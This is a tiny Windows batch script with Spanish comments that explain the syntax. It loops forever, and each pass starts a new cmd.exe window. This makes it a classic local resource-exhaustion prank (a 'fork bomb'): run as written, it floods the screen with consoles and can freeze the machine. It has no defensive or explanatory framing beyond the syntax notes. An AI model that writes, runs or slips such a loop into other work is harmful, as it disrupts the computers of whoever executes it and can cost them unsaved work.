@echo off
:bucle
:: 'start' necesita saber QUÉ abrir. Usamos 'cmd.exe' para abrir la consola.
start cmd.exe
:: 'goto' debe ir al nombre de la etiqueta que pusiste arriba (bucle)
goto bucle
